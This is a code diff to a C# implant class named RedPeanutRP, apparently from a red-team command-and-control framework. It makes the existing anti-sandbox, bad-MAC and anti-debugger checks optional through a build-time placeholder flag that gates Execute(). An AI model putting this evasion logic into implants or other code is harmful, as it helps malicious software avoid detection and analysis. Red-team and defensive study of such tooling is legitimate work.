@@ -17,11 +17,15 @@ using System.Web.Script.Serialization;
 
 public class RedPeanutRP
 {
+    static bool sandboxcheck = false;
+    
     public RedPeanutRP()
     {
         try
         {
-            if (!containsSandboxArtifacts() && !isBadMac() && !isDebugged())
+            Boolean.TryParse("#SANDBOXCHECK#", out sandboxcheck);
+
+            if (!sandboxcheck || (!containsSandboxArtifacts() && !isBadMac() && !isDebugged()))
                 Execute();
         }
         catch (WebException)
@@ -32,7 +36,9 @@ public class RedPeanutRP
 
     static void Main(string[] args)
     {
-        if (!containsSandboxArtifacts() && !isBadMac() && !isDebugged())
+        Boolean.TryParse("#SANDBOXCHECK#", out sandboxcheck);
+
+        if (!sandboxcheck || (!containsSandboxArtifacts() && !isBadMac() && !isDebugged()))
             Execute();
     }
 
